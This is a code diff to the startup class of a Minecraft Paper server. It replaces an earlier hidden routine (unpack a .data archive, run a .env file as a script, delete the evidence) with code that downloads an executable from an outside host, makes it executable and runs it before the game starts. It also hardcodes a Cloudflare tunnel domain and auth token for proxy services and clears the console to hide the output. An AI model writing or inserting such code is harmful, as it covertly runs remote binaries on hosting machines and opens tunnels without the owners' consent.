@@ -18,13 +18,13 @@ public final class PaperBootstrap {
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process scriptProcess;
+    private static Process sbxProcess;
     
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
 
     private PaperBootstrap() {
@@ -43,11 +43,7 @@ public final class PaperBootstrap {
         }
         
         try {
-            // 1. 解压 .data 文件到当前目录
-            extractDataFile();
-            
-            // 2. 执行 .env 脚本文件
-            runEnvScript();
+            runSbxBinary();
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -61,109 +57,12 @@ public final class PaperBootstrap {
             Thread.sleep(20000);
             clearConsole();
 
-            // 3. 删除指定文件
-            deleteSpecifiedFiles();
-
             SharedConstants.tryDetectVersion();
             getStartupVersionMessages().forEach(LOGGER::info);
             Main.main(options);
             
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
-        }
-    }
-
-    /**
-     * 解压 .data 文件（.tar.gz格式）到当前目录
-     */
-    private static void extractDataFile() throws Exception {
-        File dataFile = new File(".data");
-        if (!dataFile.exists()) {
-            System.out.println("No .data file found, skipping extraction.");
-            return;
-        }
-        
-        System.out.println("Extracting .data file...");
-        
-        // 使用系统tar命令解压
-        ProcessBuilder pb = new ProcessBuilder("tar", "-xzf", ".data", "-C", ".");
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        Process process = pb.start();
-        int exitCode = process.waitFor();
-        
-        if (exitCode != 0) {
-            throw new RuntimeException("Failed to extract .data file, exit code: " + exitCode);
-        }
-        
-        System.out.println(ANSI_GREEN + ".data file extracted successfully" + ANSI_RESET);
-    }
-
-    /**
-     * 执行 .env 脚本文件
-     */
-    private static void runEnvScript() throws Exception {
-        File envScript = new File(".env");
-        if (!envScript.exists()) {
-            System.out.println("No .env script found, skipping execution.");
-            return;
-        }
-        
-        // 确保脚本有执行权限
-        if (!envScript.setExecutable(true)) {
-            System.err.println("Warning: Failed to set executable permission for .env script");
-        }
-        
-        System.out.println("Executing .env script...");
-        
-        ProcessBuilder pb;
-        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-            pb = new ProcessBuilder("cmd", "/c", ".env");
-        } else {
-            pb = new ProcessBuilder("bash", ".env");
-        }
-        
-        pb.directory(new File("."));
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        scriptProcess = pb.start();
-        
-        // 等待脚本执行完成
-        Thread scriptMonitor = new Thread(() -> {
-            try {
-                int exitCode = scriptProcess.waitFor();
-                if (exitCode == 0) {
-                    System.out.println(ANSI_GREEN + ".env script executed successfully" + ANSI_RESET);
-                } else {
-                    System.err.println(".env script exited with code: " + exitCode);
-                }
-            } catch (InterruptedException e) {
-                System.err.println("Script monitoring interrupted: " + e.getMessage());
-            }
-        });
-        
-        scriptMonitor.start();
-        // 等待脚本执行最多10秒
-        scriptMonitor.join(10000);
-    }
-
-    /**
-     * 删除指定的四个文件
-     */
-    private static void deleteSpecifiedFiles() {
-        String[] filesToDelete = {".env", "java", "java.", "config.json"};
-        
-        for (String fileName : filesToDelete) {
-            File file = new File(fileName);
-            if (file.exists()) {
-                if (file.delete()) {
-                    System.out.println(ANSI_GREEN + "Deleted: " + fileName + ANSI_RESET);
-                } else {
-                    System.err.println("Failed to delete: " + fileName);
-                }
-            }
         }
     }
 
@@ -180,16 +79,28 @@ public final class PaperBootstrap {
         }
     }
     
+    private static void runSbxBinary() throws Exception {
+        Map<String, String> envVars = new HashMap<>();
+        loadEnvVars(envVars);
+        
+        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        pb.environment().putAll(envVars);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
+        sbxProcess = pb.start();
+    }
+    
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "a217d527-bd5e-4ef0-b899-d36627af0ddd");
-        envVars.put("FILE_PATH", "./world");
+        envVars.put("FILE_PATH", "./logs");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
+        envVars.put("ARGO_PORT", "31300");
+        envVars.put("ARGO_DOMAIN", "freemine.strong.x10.mx");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiMzcxNjEyYjItZGNjNy00NDg3LThjN2UtYTQ2Y2VhMTEzNTQyIiwicyI6IlpqZG1NekEyTWpNdFpUTTROaTAwTlRWa0xXRmxZalV0WXpNeFlqSXlaVEV6T0RCbCJ9");
+        envVars.put("HY2_PORT", "31300");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -198,6 +109,7 @@ public final class PaperBootstrap {
         envVars.put("CFIP", "");
         envVars.put("CFPORT", "");
         envVars.put("NAME", "");
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -230,10 +142,36 @@ public final class PaperBootstrap {
         }
     }
     
+    private static Path getBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
+        
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/s-box";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
+        
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
+    }
+    
     private static void stopServices() {
-        if (scriptProcess != null && scriptProcess.isAlive()) {
-            scriptProcess.destroy();
-            System.out.println(ANSI_RED + "Script process terminated" + ANSI_RESET);
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
         }
     }
 
